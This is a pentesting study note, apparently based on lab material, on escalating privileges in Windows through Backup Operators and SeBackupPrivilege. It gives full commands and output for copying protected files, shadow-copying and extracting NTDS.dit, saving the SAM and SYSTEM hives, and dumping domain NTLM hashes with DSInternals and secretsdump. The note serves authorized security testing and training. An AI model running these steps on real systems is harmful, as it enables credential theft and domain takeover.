---
title: Windows Privilege Escalation – Backup Operators and SeBackupPrivilege
aliases:
  - Backup Operators
  - SeBackupPrivilege
  - SeRestorePrivilege
  - Windows Backup Operators Group
  - Copying NTDS.dit with SeBackupPrivilege
tags:
  - windows
  - privilege-escalation
  - backup-operators
  - sebackupprivilege
  - serestoreprivilege
  - ntds-dit
  - active-directory
  - domain-controller
  - diskshadow
  - robocopy
  - secretsdump
  - dsinternals
  - credential-dumping
  - pentesting
---

# Windows Privilege Escalation – Backup Operators and SeBackupPrivilege

## Overview

Windows servers and Domain Controllers include several built-in groups that grant special privileges to their members.

Some of these groups are created with the operating system. Others are added when the Active Directory Domain Services role is installed and a server is promoted to a Domain Controller.

Membership in certain built-in groups can allow privilege escalation on a server or Domain Controller.

Groups highlighted in the source notes include:

| Group |
|---|
| `Backup Operators` |
| `Event Log Readers` |
| `DnsAdmins` |
| `Hyper-V Administrators` |
| `Print Operators` |
| `Server Operators` |

> [!note]
> `Hyper-V Administrators` was introduced with Windows Server 2012. The other listed groups exist from Windows Server 2008 R2 onward.

---

# Why Built-In Group Membership Matters

Accounts may be assigned to privileged built-in groups to enforce least privilege and avoid creating unnecessary Domain Admins or Enterprise Admins.

Common reasons include:

- backup operations
- vendor application requirements
- service account requirements
- delegated administrative tasks
- temporary testing of tools or scripts
- accidental or stale group membership

> [!tip]
> During assessments, always check these groups and include their members in a report appendix so the client can validate whether access is still required.

---

# Backup Operators

## Privileges Granted

Membership in `Backup Operators` grants:

```text
SeBackupPrivilege
SeRestorePrivilege
```

These privileges allow backup and restore-related access that can bypass normal file permissions in some contexts.

---

# Check Group Membership

After landing on a machine, check current group memberships.

```cmd
whoami /groups
```

Use this to determine whether the current user belongs to `Backup Operators` or another privileged built-in group.

---

# SeBackupPrivilege

## What It Allows

`SeBackupPrivilege` allows a user to back up files and directories.

Practically, this can allow the user to:

- traverse folders
- list folder contents
- copy files even without a normal ACE granting access
- access protected files using backup semantics

However, standard copy methods may fail.

> [!important]
> The standard `copy` command may not work. The copy operation must use backup semantics, specifically the `FILE_FLAG_BACKUP_SEMANTICS` flag.

---

# Important Limitation

If a file or folder has an explicit deny entry for the current user or a group the user belongs to, that deny entry can still prevent access.

This can happen even when using backup semantics.

---

# Method 1 – Copy a Protected File with SeBackupPrivilege

## Attack Flow

1. Confirm membership in `Backup Operators`.
2. Import the required PowerShell libraries.
3. Check whether `SeBackupPrivilege` is enabled.
4. Enable the privilege if needed.
5. Confirm the privilege is enabled.
6. Copy the protected file using `Copy-FileSeBackupPrivilege`.
7. Read the copied file.

---

# Step 1 – Import Required Libraries

The notes reference a PowerShell PoC that provides cmdlets for abusing `SeBackupPrivilege`.

Import the libraries in a PowerShell session:

```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
```

```powershell
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

https://github.com/giuliano108/SeBackupPrivilege

---

# Step 2 – Check Current Privileges

Check current token privileges.

```powershell
whoami /priv
```

Example output:

```powershell
PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

You can also check with:

```powershell
Get-SeBackupPrivilege
```

Example output:

```powershell
PS C:\htb> Get-SeBackupPrivilege

SeBackupPrivilege is disabled
```

> [!note]
> Depending on server settings, an elevated CMD prompt may be required to bypass UAC and use the privilege.

---

# Step 3 – Enable SeBackupPrivilege

If the privilege is disabled, enable it:

```powershell
Set-SeBackupPrivilege
```

Confirm it is enabled:

```powershell
Get-SeBackupPrivilege
```

Example output:

```powershell
PS C:\htb> Set-SeBackupPrivilege
PS C:\htb> Get-SeBackupPrivilege

SeBackupPrivilege is enabled
```

Verify again with `whoami /priv`:

```powershell
whoami /priv
```

Example output:

```powershell
PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

---

# Step 4 – Confirm the Target File Is Protected

Example target directory:

```powershell
dir C:\Confidential\
```

Example output:

```powershell
PS C:\htb> dir C:\Confidential\

    Directory: C:\Confidential

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         5/6/2021   1:01 PM             88 2021 Contract.txt
```

Try reading the protected file:

```powershell
cat 'C:\Confidential\2021 Contract.txt'
```

Example denied output:

```powershell
PS C:\htb> cat 'C:\Confidential\2021 Contract.txt'

cat : Access to the path 'C:\Confidential\2021 Contract.txt' is denied.
At line:1 char:1
+ cat 'C:\Confidential\2021 Contract.txt'
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Confidential\2021 Contract.txt:String) [Get-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
```

---

# Step 5 – Copy the Protected File

Use `Copy-FileSeBackupPrivilege`.

```powershell
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
```

Example output:

```powershell
PS C:\htb> Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt

Copied 88 bytes
```

---

# Step 6 – Read the Copied File

```powershell
cat .\Contract.txt
```

Example output:

```powershell
PS C:\htb> cat .\Contract.txt

Inlanefreight 2021 Contract

==============================

Board of Directors:

<...SNIP...>
```

> [!important]
> This demonstrates how sensitive information may be accessed without having normal file permissions.

---

# Method 2 – Attack a Domain Controller by Copying NTDS.dit

## Why NTDS.dit Matters

On a Domain Controller, the Active Directory database is stored in:

```text
C:\Windows\NTDS\ntds.dit
```

`NTDS.dit` is highly valuable because it contains NTLM hashes for all user and computer objects in the domain.

> [!warning]
> `NTDS.dit` is locked by default and is not normally accessible to unprivileged users.

---

# Backup Operators on a Domain Controller

Membership in `Backup Operators` can permit local logon to a Domain Controller.

This can create a path to extract:

- `NTDS.dit`
- `SYSTEM` hive
- domain credential hashes
- local account credential material

---

# Step 1 – Create a Shadow Copy with DiskShadow

Because `NTDS.dit` is locked, use `diskshadow.exe` to create a shadow copy of the `C:` drive and expose it as another drive.

Start DiskShadow:

```powershell
diskshadow.exe
```

DiskShadow command sequence:

```text
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
exit
```

Example session:

```powershell
PS C:\htb> diskshadow.exe

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC,  10/14/2020 12:57:52 AM

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit
```

Confirm the exposed shadow copy:

```powershell
dir E:
```

Example output:

```powershell
PS C:\htb> dir E:

    Directory: E:\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         5/6/2021   1:00 PM                Confidential
d-----        9/15/2018  12:19 AM                PerfLogs
d-r---        3/24/2021   6:20 PM                Program Files
d-----        9/15/2018   2:06 AM                Program Files (x86)
d-----         5/6/2021   1:05 PM                Tools
d-r---         5/6/2021  12:51 PM                Users
d-----        3/24/2021   6:38 PM                Windows
```

---

# Step 2 – Copy NTDS.dit Locally

Use `Copy-FileSeBackupPrivilege` to bypass ACL restrictions and copy `NTDS.dit`.

```powershell
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

Example output:

```powershell
PS C:\htb> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit

Copied 16777216 bytes
```

---

# Step 3 – Back Up SYSTEM and SAM Registry Hives

Back up the `SYSTEM` hive:

```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
```

Example output:

```cmd
C:\htb> reg save HKLM\SYSTEM SYSTEM.SAV

The operation completed successfully.
```

Back up the `SAM` hive:

```cmd
reg save HKLM\SAM SAM.SAV
```

Example output:

```cmd
C:\htb> reg save HKLM\SAM SAM.SAV

The operation completed successfully.
```

## Why SYSTEM Matters

The `SYSTEM` hive is required to obtain the boot key needed to decrypt credential material from `NTDS.dit`.

## Why SAM Matters

The `SAM` hive can be used to extract local account credential material offline.

---

# Method 3 – Extract Credentials from NTDS.dit with DSInternals

## Goal

Use the extracted `NTDS.dit` and `SYSTEM` hive to recover Active Directory credential material offline.

---

# Step 1 – Import DSInternals

```powershell
Import-Module .\DSInternals.psd1
```

---

# Step 2 – Get the Boot Key

```powershell
$key = Get-BootKey -SystemHivePath .\SYSTEM
```

---

# Step 3 – Extract a Specific Domain Account

Example: extract the Administrator account hash.

```powershell
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```

Example output excerpt:

```text
DistinguishedName: CN=Administrator,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
Sid: S-1-5-21-669053619-2741956077-1013132368-500
SamAccountName: Administrator
Enabled: True
UserAccountControl: NormalAccount, PasswordNeverExpires
AdminCount: True
Description: Built-in account for administering the computer/domain

Secrets
  NTHash: cf3a5525ee9414229e66279623ed5c58
  LMHash:
  NTHashHistory:
  LMHashHistory:
  SupplementalCredentials:
    NTLMStrongHash: 7790d8406b55c380f98b92bb2fdc63a7
```

---

# Method 4 – Extract Hashes with Impacket SecretsDump

## Goal

Use Impacket `secretsdump.py` offline to extract hashes from `NTDS.dit`.

```bash
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

Example output excerpt:

```text
Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0xc0a9116f907bd37afaaa845cb87d0550
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 85541c20c346e3198a3ae2c09df7f330
[*] Reading and decrypting hashes from ntds.dit

Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WINLPE-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7abf052dcef31f6305f1d4c84dfa7484:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a05824b8c279f2eb31495a012473d129:::
htb-student:1103:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::
svc_backup:1104:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
bob:1105:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
hyperv_adm:1106:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
printsvc:1107:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::

<SNIP>
```

Extracted hashes can be used for authorized follow-up testing such as:

- pass-the-hash validation
- offline password cracking
- password strength analysis
- identifying password reuse
- reporting password policy weaknesses

> [!tip]
> If hashes are cracked during an assessment, password cracking statistics can help support recommendations around minimum password length, banned word lists, and password reuse controls.

---

# Method 5 – Copy Files with Robocopy Backup Mode

## Why Use Robocopy

`robocopy` is built into Windows and can copy files in backup mode.

This eliminates the need for external tools in some cases.

`robocopy` can also support:

- directory replication
- multi-threaded copying
- automatic retry
- resumable copying
- comparing files before copying
- removing destination files no longer present in the source directory

---

## Copy NTDS.dit with Robocopy

```cmd
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```

Example output:

```cmd
C:\htb> robocopy /B E:\Windows\NTDS .\ntds ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Thursday, May 6, 2021 1:11:47 PM
   Source : E:\Windows\NTDS\
     Dest : C:\Tools\ntds\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

          New Dir          1    E:\Windows\NTDS\
100%        New File              16.0 m        ntds.dit

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         1         0         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :   16.00 m   16.00 m         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00

   Speed :           356962042 Bytes/sec.
   Speed :           20425.531 MegaBytes/min.
   Ended : Thursday, May 6, 2021 1:11:47 PM
```

### Command breakdown

| Part | Purpose |
|---|---|
| `robocopy` | Built-in Windows robust file copy utility |
| `/B` | Copy files in backup mode |
| `E:\Windows\NTDS` | Source directory |
| `.\ntds` | Destination directory |
| `ntds.dit` | File to copy |

---

# Practical Decision Tree

## Is the user in Backup Operators?

Check:

```cmd
whoami /groups
```

If yes, check privileges:

```cmd
whoami /priv
```

---

## Is SeBackupPrivilege disabled?

If using the PowerShell PoC cmdlets:

```powershell
Get-SeBackupPrivilege
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

---

## Is the goal to copy a protected file?

Use:

```powershell
Copy-FileSeBackupPrivilege '<protected_file>' '<destination_file>'
```

Then read the copied file:

```powershell
cat '<destination_file>'
```

---

## Is the target a Domain Controller?

Consider whether `NTDS.dit` extraction is authorized.

If yes:

1. Create a shadow copy with `diskshadow.exe`.
2. Expose it as a drive letter.
3. Copy `E:\Windows\NTDS\ntds.dit`.
4. Save the `SYSTEM` hive.
5. Extract hashes offline with DSInternals or SecretsDump.

---

## External tools blocked?

Try built-in `robocopy` backup mode:

```cmd
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```

---

# Troubleshooting

## `SeBackupPrivilege` is disabled

Enable it with the PoC cmdlet:

```powershell
Set-SeBackupPrivilege
```

Then verify:

```powershell
Get-SeBackupPrivilege
```

---

## Privilege is enabled but copy fails

Possible causes:

- explicit deny ACE applies to the user or group
- UAC or elevation issue
- wrong path
- file is locked
- destination path is not writable
- backup semantics were not used

---

## Standard `copy` fails

Expected behavior. Use one of:

```powershell
Copy-FileSeBackupPrivilege '<source>' '<destination>'
```

or:

```cmd
robocopy /B '<source_directory>' '<destination_directory>' '<filename>'
```

---

## NTDS.dit is locked

Use `diskshadow.exe` to create and expose a shadow copy.

```text
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
```

Then copy from:

```text
E:\Windows\NTDS\ntds.dit
```

---

## Hash extraction fails

Check:

- `ntds.dit` was copied correctly
- correct `SYSTEM` hive was saved
- paths are correct
- DSInternals module is imported
- SecretsDump syntax is correct
- the files came from the same system / Domain Controller

---

# Command Reference

## Check group membership

```cmd
whoami /groups
```

## Check privileges

```cmd
whoami /priv
```

## Import SeBackupPrivilege PoC libraries

```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

## Check SeBackupPrivilege state

```powershell
Get-SeBackupPrivilege
```

## Enable SeBackupPrivilege

```powershell
Set-SeBackupPrivilege
```

## Copy protected file with SeBackupPrivilege

```powershell
Copy-FileSeBackupPrivilege '<source_file>' '<destination_file>'
```

## Start DiskShadow

```powershell
diskshadow.exe
```

## DiskShadow shadow copy sequence

```text
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
exit
```

## Copy NTDS.dit with SeBackupPrivilege

```powershell
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

## Save SYSTEM hive

```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
```

## Save SAM hive

```cmd
reg save HKLM\SAM SAM.SAV
```

## Import DSInternals

```powershell
Import-Module .\DSInternals.psd1
```

## Get boot key

```powershell
$key = Get-BootKey -SystemHivePath .\SYSTEM
```

## Extract a domain account with DSInternals

```powershell
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```

## Extract hashes offline with SecretsDump

```bash
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

## Copy with Robocopy backup mode

```cmd
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```

---

# Key Takeaways

- Built-in Windows groups can grant powerful privileges that lead to escalation.
- `Backup Operators` grants `SeBackupPrivilege` and `SeRestorePrivilege`.
- `SeBackupPrivilege` can allow protected file copying using backup semantics.
- Standard copy commands may fail because they do not use the required backup semantics.
- `Copy-FileSeBackupPrivilege` can copy files that normal reads cannot access.
- On Domain Controllers, `NTDS.dit` is a high-value target because it contains domain credential hashes.
- `diskshadow.exe` can create a shadow copy so locked files such as `NTDS.dit` can be copied.
- The `SYSTEM` hive is needed to decrypt `NTDS.dit` credential material.
- `secretsdump.py` and DSInternals can extract hashes offline from copied files.
- `robocopy /B` provides a built-in backup-mode copy option without requiring external tools.

---

# Related Notes

- [[Windows Privilege Escalation]]
- [[Windows Built-In Groups]]
- [[Backup Operators]]
- [[SeBackupPrivilege]]
- [[SeRestorePrivilege]]
- [[NTDS.dit]]
- [[DiskShadow]]
- [[Volume Shadow Copy]]
- [[DSInternals]]
- [[SecretsDump]]
- [[Pass-the-Hash]]
- [[Hashcat]]
- [[Robocopy]]

---

# Tags

#windows
#privilege-escalation
#backup-operators
#sebackupprivilege
#serestoreprivilege
#ntds-dit
#domain-controller
#active-directory
#diskshadow
#volume-shadow-copy
#secretsdump
#dsinternals
#credential-dumping
#robocopy
#pentesting